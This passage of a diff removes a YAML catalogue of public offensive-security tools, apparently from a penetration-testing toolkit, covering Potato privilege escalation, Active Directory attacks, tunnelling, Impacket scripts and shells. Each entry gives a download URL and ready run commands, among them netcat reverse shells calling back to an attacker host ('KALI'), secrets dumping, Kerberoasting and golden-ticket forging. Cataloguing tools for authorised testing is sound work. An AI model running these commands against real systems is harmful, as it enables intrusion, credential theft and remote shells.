-    notes: "Run with: .\\JuicyPotato.exe -l 1337 -c {CLSID} -p cmd.exe -t *"
-
-  - name: "JuicyPotatoNG.exe"
-    display_name: "JuicyPotatoNG"
-    description: "Next generation JuicyPotato - works on newer Windows versions"
-    project_url: "https://github.com/antonioCoco/JuicyPotatoNG"
-    upstream_url: "https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip"
-    upstream_version: "v1.1"
-    license: "MIT"
-    sha256: ""
-    folder: "JuicyPotato"
-    categories: ["TokenAbuse"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["token-abuse", "potato", "impersonation", "privesc"]
-    finding_triggers: ["se_impersonate_enabled", "se_assign_primary_token_enabled"]
-    notes: "Extracted from zip; works on Windows 10/11 and Server 2019+"
-
-  - name: "SweetPotato.exe"
-    display_name: "SweetPotato"
-    description: "Collection of potato privilege escalation techniques in one binary"
-    project_url: "https://github.com/CCob/SweetPotato"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SweetPotato.exe"
-    upstream_version: "latest"
-    license: "MIT"
-    sha256: ""
-    folder: "SweetPotato"
-    categories: ["TokenAbuse"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["token-abuse", "potato", "impersonation", "privesc"]
-    finding_triggers: ["se_impersonate_enabled", "se_assign_primary_token_enabled"]
-    notes: "Run with: .\\SweetPotato.exe -p cmd.exe"
-
-  - name: "RoguePotato.exe"
-    display_name: "RoguePotato"
-    description: "Potato escalation targeting OXID resolver on remote IP"
-    project_url: "https://github.com/antonioCoco/RoguePotato"
-    upstream_url: "https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip"
-    upstream_version: "v1.0"
-    license: "MIT"
-    sha256: ""
-    folder: "RoguePotato"
-    categories: ["TokenAbuse"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["token-abuse", "potato", "impersonation", "privesc"]
-    finding_triggers: ["se_impersonate_enabled", "se_assign_primary_token_enabled"]
-    notes: "Requires remote OXID resolver; extracted from zip"
-
-  - name: "LocalPotato.exe"
-    display_name: "LocalPotato"
-    description: "NTLM local relay to escalate from service to SYSTEM"
-    project_url: "https://github.com/decoder-it/LocalPotato"
-    upstream_url: "https://github.com/decoder-it/LocalPotato/releases/download/v0.2/LocalPotato.exe"
-    upstream_version: "v0.2"
-    license: "MIT"
-    sha256: ""
-    folder: "LocalPotato"
-    categories: ["TokenAbuse"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["token-abuse", "potato", "ntlm", "relay", "privesc"]
-    finding_triggers: ["se_impersonate_enabled", "se_assign_primary_token_enabled"]
-    notes: "Run with: .\\LocalPotato.exe"
-
-  - name: "RemotePotato0.exe"
-    display_name: "RemotePotato0"
-    description: "Escalation via DCOM activation and NTLM relay to domain controller"
-    project_url: "https://github.com/antonioCoco/RemotePotato0"
-    upstream_url: "https://github.com/antonioCoco/RemotePotato0/releases/download/1.2/RemotePotato0.zip"
-    upstream_version: "v1.2"
-    license: "MIT"
-    sha256: ""
-    folder: "RemotePotato0"
-    categories: ["TokenAbuse"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["token-abuse", "potato", "ntlm", "relay", "privesc"]
-    finding_triggers: ["se_impersonate_enabled", "se_assign_primary_token_enabled"]
-    notes: "Requires network relay setup; extracted from zip"
-
-  - name: "CoercedPotato.exe"
-    display_name: "CoercedPotato"
-    description: "Potato escalation using coerced authentication"
-    project_url: "https://github.com/Prepouce/CoercedPotato"
-    upstream_url: "https://github.com/Prepouce/CoercedPotato/releases/download/v1.0.1/CoercedPotato.exe"
-    upstream_version: "v1.0.1"
-    license: "MIT"
-    sha256: ""
-    folder: "CoercedPotato"
-    categories: ["TokenAbuse"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["token-abuse", "potato", "coercion", "privesc"]
-    finding_triggers: ["se_impersonate_enabled", "se_assign_primary_token_enabled"]
-    notes: "Run with: .\\CoercedPotato.exe -cmd cmd.exe"
-
-  - name: "GenericPotato.exe"
-    display_name: "GenericPotato"
-    description: "Generic token impersonation potato for HTTP-based impersonation"
-    project_url: "https://github.com/micahvandeusen/GenericPotato"
-    upstream_url: "https://github.com/micahvandeusen/GenericPotato/releases/download/1.0.2/GenericPotato.exe"
-    upstream_version: "v1.0.2"
-    license: "MIT"
-    sha256: ""
-    folder: "GenericPotato"
-    categories: ["TokenAbuse"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["token-abuse", "potato", "impersonation", "privesc"]
-    finding_triggers: ["se_impersonate_enabled", "se_assign_primary_token_enabled"]
-    notes: "Run with: .\\GenericPotato.exe"
-
-  - name: "SharpEfsPotato.exe"
-    display_name: "SharpEfsPotato"
-    description: "Potato privilege escalation via EFS (Encrypting File System) abuse"
-    project_url: "https://github.com/bugch3ck/SharpEfsPotato"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpEfsPotato.exe"
-    upstream_version: "latest"
-    license: "MIT"
-    sha256: ""
-    folder: "SharpEfsPotato"
-    categories: ["TokenAbuse"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["token-abuse", "potato", "efs", "privesc"]
-    finding_triggers: ["se_impersonate_enabled", "se_assign_primary_token_enabled"]
-    notes: "Run with: .\\SharpEfsPotato.exe -p cmd.exe"
-
-  # ---------------------------------------------------------------------------
-  # AD (Active Directory)
-  # ---------------------------------------------------------------------------
-
-  - name: "SharpHound.exe"
-    display_name: "SharpHound (Binary)"
-    description: "BloodHound C# data collector - enumerates AD objects and relationships"
-    project_url: "https://github.com/SpecterOps/SharpHound"
-    upstream_url: "https://github.com/SpecterOps/SharpHound/releases/download/v2.5.9/SharpHound-v2.5.9.zip"
-    upstream_version: "v2.5.9"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "SharpHound"
-    categories: ["AD"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["ad", "bloodhound", "enumeration", "graph"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\SharpHound.exe -c all"
-
-  - name: "SharpHound.ps1"
-    display_name: "SharpHound (PowerShell)"
-    description: "BloodHound PowerShell collector - alternative to binary"
-    project_url: "https://github.com/SpecterOps/SharpHound"
-    upstream_url: "https://github.com/SpecterOps/SharpHound/releases/download/v2.5.9/SharpHound-v2.5.9.zip"
-    upstream_version: "v2.5.9"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "SharpHound"
-    categories: ["AD"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["ad", "bloodhound", "enumeration", "powershell"]
-    finding_triggers: ["domain_joined"]
-    notes: "Import-Module .\\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All"
-
-  - name: "RustHound.exe"
-    display_name: "RustHound (Windows)"
-    description: "Cross-platform BloodHound collector written in Rust"
-    project_url: "https://github.com/NH-RED-TEAM/RustHound"
-    upstream_url: "https://github.com/NH-RED-TEAM/RustHound/releases/latest/download/rusthound_x86_64.exe"
-    upstream_version: "latest"
-    license: "GPL-3.0"
-    sha256: ""
-    folder: "RustHound"
-    categories: ["AD"]
-    platform: "windows"
-    architecture: "x64"
-    tags: ["ad", "bloodhound", "enumeration", "rust"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\RustHound.exe -d domain.local"
-
-  - name: "rusthound_linux"
-    display_name: "RustHound (Linux)"
-    description: "Cross-platform BloodHound collector for Linux - musl static binary"
-    project_url: "https://github.com/NH-RED-TEAM/RustHound"
-    upstream_url: "https://github.com/NH-RED-TEAM/RustHound/releases/latest/download/rusthound_musl"
-    upstream_version: "latest"
-    license: "GPL-3.0"
-    sha256: ""
-    folder: "RustHound"
-    categories: ["AD"]
-    platform: "linux"
-    architecture: "x64"
-    tags: ["ad", "bloodhound", "enumeration", "rust", "linux"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: ./rusthound_linux -d domain.local"
-
-  - name: "Certify.exe"
-    display_name: "Certify"
-    description: "Enumerate and abuse misconfigured AD Certificate Services (ADCS)"
-    project_url: "https://github.com/GhostPack/Certify"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Certify.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "Certify"
-    categories: ["AD"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["ad", "adcs", "certificates", "ghostpack"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\Certify.exe find /vulnerable"
-
-  - name: "Whisker.exe"
-    display_name: "Whisker"
-    description: "C# tool for Shadow Credentials attack on AD computer/user objects"
-    project_url: "https://github.com/eladshamir/Whisker"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Whisker.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "Whisker"
-    categories: ["AD"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["ad", "shadow-credentials", "msds-keycredentiallink"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\Whisker.exe add /target:computername$"
-
-  - name: "KrbRelayUp.exe"
-    display_name: "KrbRelayUp"
-    description: "Universal no-fix privilege escalation via Kerberos relay in Windows domain"
-    project_url: "https://github.com/Dec0ne/KrbRelayUp"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/KrbRelayUp.exe"
-    upstream_version: "latest"
-    license: "MIT"
-    sha256: ""
-    folder: "KrbRelayUp"
-    categories: ["AD"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["ad", "kerberos", "relay", "privesc"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount -ComputerName attacker$ -ComputerPassword pass"
-
-  - name: "ADCSPwn.exe"
-    display_name: "ADCSPwn"
-    description: "Escalate AD privileges via misconfigured certificate templates"
-    project_url: "https://github.com/bats3c/ADCSPwn"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/ADCSPwn.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "ADCSPwn"
-    categories: ["AD"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["ad", "adcs", "certificates", "privesc"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\ADCSPwn.exe --adcs ca.domain.local --port 9001"
-
-  - name: "PetitPotam.exe"
-    display_name: "PetitPotam (Binary)"
-    description: "Coerce NTLM authentication from Windows hosts via MS-EFSRPC"
-    project_url: "https://github.com/topotam/PetitPotam"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/PetitPotam.exe"
-    upstream_version: "latest"
-    license: "MIT"
-    sha256: ""
-    folder: "PetitPotam"
-    categories: ["AD"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["ad", "coercion", "ntlm", "efsrpc"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\PetitPotam.exe listener target"
-
-  - name: "PetitPotam.py"
-    display_name: "PetitPotam (Python)"
-    description: "Python implementation of PetitPotam NTLM coercion attack"
-    project_url: "https://github.com/topotam/PetitPotam"
-    upstream_url: "https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py"
-    upstream_version: "latest"
-    license: "MIT"
-    sha256: ""
-    folder: "PetitPotam"
-    categories: ["AD"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["ad", "coercion", "ntlm", "efsrpc", "python"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: python3 PetitPotam.py listener target"
-
-  - name: "SharpLAPS.exe"
-    display_name: "SharpLAPS"
-    description: "Retrieve LAPS (Local Admin Password Solution) passwords from AD"
-    project_url: "https://github.com/swisskyrepo/SharpLAPS"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpLAPS.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "SharpLAPS"
-    categories: ["AD"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["ad", "laps", "passwords"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\SharpLAPS.exe /user:user /pass:pass /host:dc"
-
-  - name: "SharpGPOAbuse.exe"
-    display_name: "SharpGPOAbuse"
-    description: "Abuse Group Policy Objects for privilege escalation in AD"
-    project_url: "https://github.com/FSecureLABS/SharpGPOAbuse"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpGPOAbuse.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "SharpGPOAbuse"
-    categories: ["AD"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["ad", "gpo", "group-policy", "privesc"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount user --GPOName \"Default Domain Policy\""
-
-  - name: "kerbrute_linux"
-    display_name: "Kerbrute (Linux)"
-    description: "Kerberos brute-force and user enumeration - Linux binary"
-    project_url: "https://github.com/ropnop/kerbrute"
-    upstream_url: "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Kerbrute"
-    categories: ["AD"]
-    platform: "linux"
-    architecture: "x64"
-    tags: ["ad", "kerberos", "brute-force", "enumeration"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: ./kerbrute_linux userenum -d domain.local users.txt"
-
-  - name: "kerbrute.exe"
-    display_name: "Kerbrute (Windows)"
-    description: "Kerberos brute-force and user enumeration - Windows binary"
-    project_url: "https://github.com/ropnop/kerbrute"
-    upstream_url: "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Kerbrute"
-    categories: ["AD"]
-    platform: "windows"
-    architecture: "x64"
-    tags: ["ad", "kerberos", "brute-force", "enumeration"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\kerbrute.exe userenum -d domain.local users.txt"
-
-  - name: "Farmer.exe"
-    display_name: "Farmer"
-    description: "Collect NetNTLM hashes by planting WebDAV references"
-    project_url: "https://github.com/mdsecactivebreach/Farmer"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Farmer.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "Farmer"
-    categories: ["AD"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["ad", "netntlm", "credential-harvest"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\Farmer.exe <port> [minutes-to-run]"
-
-  - name: "PowerView.ps1"
-    display_name: "PowerView"
-    description: "PowerSploit AD enumeration module - find shares, GPOs, ACLs, trusts"
-    project_url: "https://github.com/PowerShellMafia/PowerSploit"
-    upstream_url: "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "PowerSploit"
-    categories: ["AD"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["ad", "enumeration", "powersploit", "powershell"]
-    finding_triggers: ["domain_joined"]
-    notes: "Import-Module .\\PowerView.ps1; Get-DomainUser"
-
-  # ---------------------------------------------------------------------------
-  # Tunneling
-  # ---------------------------------------------------------------------------
-
-  - name: "chisel_linux"
-    display_name: "Chisel (Linux)"
-    description: "Fast TCP/UDP tunnel over HTTP - Linux amd64 binary"
-    project_url: "https://github.com/jpillora/chisel"
-    upstream_url: "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz"
-    upstream_version: "v1.10.1"
-    license: "MIT"
-    sha256: ""
-    folder: "Chisel"
-    categories: ["Tunneling"]
-    platform: "linux"
-    architecture: "x64"
-    tags: ["tunneling", "pivoting", "http", "socks"]
-    finding_triggers: ["*"]
-    notes: "Server: ./chisel_linux server -p 8080 --reverse; Client: ./chisel_linux client IP:8080 R:socks"
-
-  - name: "chisel.exe"
-    display_name: "Chisel (Windows)"
-    description: "Fast TCP/UDP tunnel over HTTP - Windows amd64 binary"
-    project_url: "https://github.com/jpillora/chisel"
-    upstream_url: "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz"
-    upstream_version: "v1.10.1"
-    license: "MIT"
-    sha256: ""
-    folder: "Chisel"
-    categories: ["Tunneling"]
-    platform: "windows"
-    architecture: "x64"
-    tags: ["tunneling", "pivoting", "http", "socks"]
-    finding_triggers: ["*"]
-    notes: "Client: .\\chisel.exe client KALI:8080 R:socks"
-
-  - name: "ligolo-agent.exe"
-    display_name: "Ligolo-ng Agent (Windows)"
-    description: "Ligolo-ng tunneling agent for Windows"
-    project_url: "https://github.com/nicocha30/ligolo-ng"
-    upstream_url: "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip"
-    upstream_version: "v0.7.5"
-    license: "GPL-3.0"
-    sha256: ""
-    folder: "Ligolo"
-    categories: ["Tunneling"]
-    platform: "windows"
-    architecture: "x64"
-    tags: ["tunneling", "pivoting", "ligolo"]
-    finding_triggers: ["*"]
-    notes: "Run with: .\\ligolo-agent.exe -connect KALI:11601 -ignore-cert"
-
-  - name: "ligolo-agent_linux"
-    display_name: "Ligolo-ng Agent (Linux)"
-    description: "Ligolo-ng tunneling agent for Linux"
-    project_url: "https://github.com/nicocha30/ligolo-ng"
-    upstream_url: "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz"
-    upstream_version: "v0.7.5"
-    license: "GPL-3.0"
-    sha256: ""
-    folder: "Ligolo"
-    categories: ["Tunneling"]
-    platform: "linux"
-    architecture: "x64"
-    tags: ["tunneling", "pivoting", "ligolo"]
-    finding_triggers: ["*"]
-    notes: "Run with: ./ligolo-agent_linux -connect KALI:11601 -ignore-cert"
-
-  - name: "ligolo-proxy_linux"
-    display_name: "Ligolo-ng Proxy (Linux)"
-    description: "Ligolo-ng proxy server for Linux - runs on attack host"
-    project_url: "https://github.com/nicocha30/ligolo-ng"
-    upstream_url: "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz"
-    upstream_version: "v0.7.5"
-    license: "GPL-3.0"
-    sha256: ""
-    folder: "Ligolo"
-    categories: ["Tunneling"]
-    platform: "linux"
-    architecture: "x64"
-    tags: ["tunneling", "pivoting", "ligolo", "server"]
-    finding_triggers: ["*"]
-    notes: "Run with: ./ligolo-proxy_linux -selfcert -laddr 0.0.0.0:11601"
-
-  - name: "socat"
-    display_name: "Socat (Linux)"
-    description: "Multipurpose relay for bidirectional data transfer - static Linux binary"
-    project_url: "https://github.com/andrew-d/static-binaries"
-    upstream_url: "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
-    upstream_version: "latest"
-    license: "GPL-2.0"
-    sha256: ""
-    folder: "Socat"
-    categories: ["Tunneling"]
-    platform: "linux"
-    architecture: "x64"
-    tags: ["tunneling", "relay", "port-forward"]
-    finding_triggers: ["*"]
-    notes: "Run with: ./socat TCP-LISTEN:8080,fork TCP:target:80"
-
-  - name: "socat.exe"
-    display_name: "Socat (Windows)"
-    description: "Multipurpose relay for bidirectional data transfer - Windows build"
-    project_url: "https://github.com/tech128/socat-1.7.3.0-windows"
-    upstream_url: "https://github.com/tech128/socat-1.7.3.0-windows/raw/master/socat-1.7.3.0/socat.exe"
-    upstream_version: "v1.7.3.0"
-    license: "GPL-2.0"
-    sha256: ""
-    folder: "Socat"
-    categories: ["Tunneling"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["tunneling", "relay", "port-forward"]
-    finding_triggers: ["*"]
-    notes: "Run with: socat.exe TCP-LISTEN:8080,fork TCP:target:80"
-
-  - name: "nc.exe"
-    display_name: "Netcat (64-bit)"
-    description: "Netcat for Windows - network utility for reading/writing TCP/UDP"
-    project_url: "https://github.com/int0x33/nc.exe"
-    upstream_url: "https://github.com/int0x33/nc.exe/raw/master/nc64.exe"
-    upstream_version: "latest"
-    license: "GPL-2.0"
-    sha256: ""
-    folder: "Netcat"
-    categories: ["Tunneling", "Shells"]
-    platform: "windows"
-    architecture: "x64"
-    tags: ["networking", "reverse-shell", "tunneling"]
-    finding_triggers: ["*"]
-    notes: "Reverse shell: nc.exe -e cmd.exe KALI 4444"
-
-  - name: "nc32.exe"
-    display_name: "Netcat (32-bit)"
-    description: "Netcat for Windows - 32-bit build"
-    project_url: "https://github.com/int0x33/nc.exe"
-    upstream_url: "https://github.com/int0x33/nc.exe/raw/master/nc.exe"
-    upstream_version: "latest"
-    license: "GPL-2.0"
-    sha256: ""
-    folder: "Netcat"
-    categories: ["Tunneling", "Shells"]
-    platform: "windows"
-    architecture: "x86"
-    tags: ["networking", "reverse-shell", "tunneling"]
-    finding_triggers: ["*"]
-    notes: "Reverse shell: nc32.exe -e cmd.exe KALI 4444"
-
-  # ---------------------------------------------------------------------------
-  # Impacket
-  # ---------------------------------------------------------------------------
-
-  - name: "secretsdump.py"
-    display_name: "secretsdump"
-    description: "Impacket - remote SAM/LSA/NTDS secrets extraction"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "credentials", "sam", "ntds", "python"]
-    finding_triggers: ["autologon_credentials", "saved_credentials_cmdkey", "ps_history_credentials"]
-    notes: "Run with: python3 secretsdump.py domain/user:pass@target"
-
-  - name: "GetUserSPNs.py"
-    display_name: "GetUserSPNs"
-    description: "Impacket - Kerberoasting to extract service ticket hashes"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/GetUserSPNs.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "kerberoasting", "ad", "python"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: python3 GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request"
-
-  - name: "GetNPUsers.py"
-    display_name: "GetNPUsers"
-    description: "Impacket - AS-REP roasting for accounts without Kerberos pre-auth"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/GetNPUsers.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "asreproasting", "ad", "python"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: python3 GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP"
-
-  - name: "psexec.py"
-    display_name: "psexec (Impacket)"
-    description: "Impacket - remote command execution via SMB/RPC"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/psexec.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "execution", "smb", "python"]
-    finding_triggers: ["*"]
-    notes: "Run with: python3 psexec.py domain/user:pass@target"
-
-  - name: "wmiexec.py"
-    display_name: "wmiexec"
-    description: "Impacket - semi-interactive shell via WMI"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/wmiexec.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "execution", "wmi", "python"]
-    finding_triggers: ["*"]
-    notes: "Run with: python3 wmiexec.py domain/user:pass@target"
-
-  - name: "smbexec.py"
-    display_name: "smbexec"
-    description: "Impacket - semi-interactive shell via SMB service creation"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/smbexec.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "execution", "smb", "python"]
-    finding_triggers: ["*"]
-    notes: "Run with: python3 smbexec.py domain/user:pass@target"
-
-  - name: "atexec.py"
-    display_name: "atexec"
-    description: "Impacket - command execution via scheduled task (AT)"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/atexec.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "execution", "scheduled-task", "python"]
-    finding_triggers: ["*"]
-    notes: "Run with: python3 atexec.py domain/user:pass@target \"command\""
-
-  - name: "dcomexec.py"
-    display_name: "dcomexec"
-    description: "Impacket - semi-interactive shell via DCOM"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/dcomexec.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "execution", "dcom", "python"]
-    finding_triggers: ["*"]
-    notes: "Run with: python3 dcomexec.py domain/user:pass@target"
-
-  - name: "getTGT.py"
-    display_name: "getTGT"
-    description: "Impacket - request TGT for a given user with password/hash/key"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/getTGT.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "kerberos", "tgt", "python"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: python3 getTGT.py domain/user:pass"
-
-  - name: "getST.py"
-    display_name: "getST"
-    description: "Impacket - request service ticket using TGT"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/getST.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "kerberos", "service-ticket", "python"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: python3 getST.py -spn cifs/target domain/user"
-
-  - name: "ticketer.py"
-    display_name: "ticketer"
-    description: "Impacket - create golden/silver Kerberos tickets"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/ticketer.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "kerberos", "golden-ticket", "silver-ticket", "python"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: python3 ticketer.py -domain domain.local -nthash HASH -domain-sid SID -extra-sid SID administrator"
-
-  - name: "ntlmrelayx.py"
-    display_name: "ntlmrelayx"
-    description: "Impacket - NTLM relay attacks to various protocols"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/ntlmrelayx.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "ntlm", "relay", "ad", "python"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: python3 ntlmrelayx.py -tf targets.txt -smb2support"
-
-  - name: "addcomputer.py"
-    display_name: "addcomputer"
-    description: "Impacket - add a computer account to the domain"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/addcomputer.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "ad", "computer-account", "python"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: python3 addcomputer.py domain/user:pass -computer-name attacker$ -computer-pass pass"
-
-  - name: "rbcd.py"
-    display_name: "rbcd"
-    description: "Impacket - Resource-Based Constrained Delegation attack"
-    project_url: "https://github.com/fortra/impacket"
-    upstream_url: "https://raw.githubusercontent.com/fortra/impacket/master/examples/rbcd.py"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "Impacket"
-    categories: ["Impacket"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["impacket", "ad", "rbcd", "delegation", "python"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: python3 rbcd.py domain/user:pass -delegate-to target$ -delegate-from attacker$ -action write"
-
-  # ---------------------------------------------------------------------------
-  # Shells
-  # ---------------------------------------------------------------------------
-
-  - name: "Invoke-PowerShellTcp.ps1"
-    display_name: "Invoke-PowerShellTcp"
-    description: "Nishang PowerShell reverse TCP shell"
-    project_url: "https://github.com/samratashok/nishang"
